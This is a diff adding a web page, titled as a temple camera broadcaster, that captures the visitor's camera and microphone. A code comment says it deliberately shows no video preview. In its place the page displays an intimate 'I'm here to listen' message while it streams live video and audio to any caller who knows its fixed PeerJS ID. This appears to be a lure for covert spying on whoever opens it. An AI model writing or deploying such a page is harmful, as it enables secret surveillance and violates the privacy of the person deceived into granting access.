@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Temple Camera Broadcaster</title>
+  <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+  <style>
+    body { 
+      font-family: Arial, sans-serif; 
+      background: #0f0f0f; 
+      color: #fff; 
+      text-align: center; 
+      padding: 20px; 
+      margin: 0;
+    }
+    .container {
+      max-width: 600px;
+      margin: 40px auto;
+      background: #1a1a1a;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+    }
+    .btn { 
+      padding: 12px 24px; 
+      font-size: 16px; 
+      background: #28a745; 
+      color: white; 
+      border: none; 
+      font-weight: bold; 
+      cursor: pointer; 
+      border-radius: 6px; 
+    }
+    .message-card {
+      display: none;
+      background: #2a2a2a;
+      border-left: 4px solid #d4af37;
+      padding: 25px;
+      border-radius: 8px;
+      margin-top: 20px;
+      font-size: 1.2rem;
+      line-height: 1.5;
+      color: #fff8dc;
+    }
+    .log { 
+      background: #111; 
+      padding: 10px; 
+      border-radius: 6px; 
+      font-family: monospace; 
+      font-size: 12px; 
+      margin-top: 20px; 
+      text-align: left; 
+      height: 100px; 
+      overflow-y: auto; 
+      color: #aaa;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h2>📷 Temple Camera Broadcaster</h2>
+    
+    <button id="startBtn" class="btn" onclick="startBroadcast()">Start Live Stream</button>
+
+    <!-- Custom message box replacing video preview -->
+    <div id="customMessage" class="message-card">
+      Hi cutiee you can tell me any thing now <br>
+      I'm here to listen
+    </div>
+
+    <div id="logBox" class="log">Ready to start...<br></div>
+  </div>
+
+  <script>
+    const STREAM_ID = "shree-temple-stream-live-2026"; 
+
+    const logBox = document.getElementById('logBox');
+    const customMessage = document.getElementById('customMessage');
+    let localStream = null;
+
+    function log(msg) {
+      logBox.innerHTML += `> ${msg}<br>`;
+      logBox.scrollTop = logBox.scrollHeight;
+    }
+
+    async function startBroadcast() {
+      try {
+        log("Requesting camera and microphone access...");
+        
+        // Capture media stream without creating a preview video element
+        localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        log("Camera accessed successfully.");
+
+        document.getElementById('startBtn').style.display = 'none';
+
+        log("Connecting to PeerJS Signaling Server...");
+        const peer = new Peer(STREAM_ID, {
+          config: {
+            iceServers: [
+              { urls: 'stun:stun.l.google.com:19302' },
+              { urls: 'stun:stun1.l.google.com:19302' },
+              { urls: 'stun:stun2.l.google.com:19302' }
+            ]
+          }
+        });
+
+        peer.on('open', (id) => {
+          log(`🔴 BROADCAST LIVE! ID registered: ${id}`);
+          // Display message card once live
+          customMessage.style.display = 'block';
+        });
+
+        // Answer incoming calls from visitors with camera feed
+        peer.on('call', (call) => {
+          log("Incoming visitor connected. Sending live camera stream...");
+          call.answer(localStream);
+        });
+
+        peer.on('error', (err) => {
+          log(`❌ Error: ${err.type}`);
+          if (err.type === 'unavailable-id') {
+            log("⚠️ Stream ID active in another window. Close other tabs and try again.");
+          }
+        });
+
+      } catch (err) {
+        log(`❌ Permission or Camera Error: ${err.message}`);
+      }
+    }
+  </script>
+</body>
+</html>
